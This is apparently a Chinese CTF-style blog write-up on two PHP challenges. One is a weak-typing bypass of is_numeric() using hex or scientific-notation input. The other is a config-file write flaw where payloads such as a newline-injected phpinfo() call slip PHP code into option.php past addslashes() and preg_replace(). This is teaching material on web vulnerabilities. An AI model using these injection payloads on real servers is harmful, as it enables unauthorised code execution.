# PHP-Challenge-1


&lt;!--more--&gt;

# 0x01 弱类型

```php
&lt;?php
show_source(__FILE__);
$flag = &#34;xxxx&#34;;
if(isset($_GET[&#39;time&#39;])){ 
        if(!is_numeric($_GET[&#39;time&#39;])){ 
                echo &#39;The time must be number.&#39;; 
        }else if($_GET[&#39;time&#39;] &lt; 60 * 60 * 24 * 30 * 2){ 	//5184000
                        echo &#39;This time is too short.&#39;; 
        }else if($_GET[&#39;time&#39;] &gt; 60 * 60 * 24 * 30 * 3){ 	//7776000
                        echo &#39;This time is too long.&#39;; 
        }else{ 
                sleep((int)$_GET[&#39;time&#39;]); 
                echo $flag; 
        } 
                echo &#39;&lt;hr&gt;&#39;; 
}
?&gt;
```

程序逻辑大致如下： 

1. 通过**is_numeric**判断**time**是否为数字
2. 要求输入的**time**位于**5184000**和**7776000**之间
3. 将输入的**time**转换为**int**并传入**sleep()**函数

如果真的将传入的**time**设置为上述的区间，那么程序的**sleep()**函数将会让我们一直等。

这里运用到PHP弱类型的性质就可以解决，**is_numeric()**函数支持十六进制字符串和科学记数法型字符串，而**int**强制转换下，会出现错误解析。



&gt; 5184000	  -&gt;   0x4f1a00

因此第一种方法，我们可以传入**?time=0x4f1a01**

还有就是科学记数法类型的**?time=5.184001e6**，五秒钟还是可以等的。



# 0x02 配置文件写入问题

&gt; index.php

```php
&lt;?php
$str = addslashes($_GET[&#39;option&#39;]);
$file = file_get_contents(&#39;xxxxx/option.php&#39;);
$file = preg_replace(&#39;|\$option=\&#39;.*\&#39;;|&#39;, &#34;\$option=&#39;$str&#39;;&#34;, $file);
file_put_contents(&#39;xxxxx/option.php&#39;, $file);
```

&gt; xxxxx/option.php

```php
&lt;?php
$option=&#39;test&#39;;
?&gt;
```

程序逻辑大致如下：

1. 将传入的**option**参数进行**addslashes()**字符串转义操作
2. 通过正则将**$file**中的**test**改为**$str**的值
3. 将修改后的值写入文件

这个问题是在p师傅的知识星球里面提出来的，CHY师傅整理出来的，这种情景通常出现在配置文件写入中。

### 方法一：换行符突破

&gt; ```php
&gt; ?option=aaa&#39;;%0aphpinfo();//
&gt; ```

经过**addslashes()**处理过后，**$str = aaa\\&#39;;%0aphpinfo();//**

通过正则匹配过后写入文件，**option.php**的内容变为如下内容

```php
&lt;?php 
$option=&#39;aaa\&#39;;
phpinfo();//&#39;;
?&gt;
```

可以看出后一个单引号被转义，所以单引号并没有被闭合，那么**phpinfo**就不能执行，所以再进行一次写入。

&gt; ?option=xxx

再次进行正则匹配时候，则会将引号里面的替换为**xxx**，此时**option.php**内容如下：

```php
&lt;?php
$option=&#39;xxx&#39;;
phpinfo();//&#39;;
?&gt;
```

这时候就可以执行**phpinfo**。



### 方法二：preg_replace()的转义

 ```php
 ?option=aaa\&#39;;phpinfo();//
 ```

**addslashes()**转换过后**$str = aaa\\\\\\&#39;;phpinfo();//**

经过**preg_replace()**匹配过后，会对**\\**进行转义处理，所以写入的信息如下：

```php
&lt;?php
$option=&#39;aaa\\&#39;;phpinfo();//&#39;;
?&gt;
```



# 总结

Reference：

&gt; [http://www.cnblogs.com/iamstudy/articles/config_file_write_vue.html](http://www.cnblogs.com/iamstudy/articles/config_file_write_vue.html)
&gt;
&gt; P师傅知识星球

不断的学习

---

> Author:   
> URL: http://localhost:1313/posts/web%E5%AE%89%E5%85%A8/php-challenge-1/  

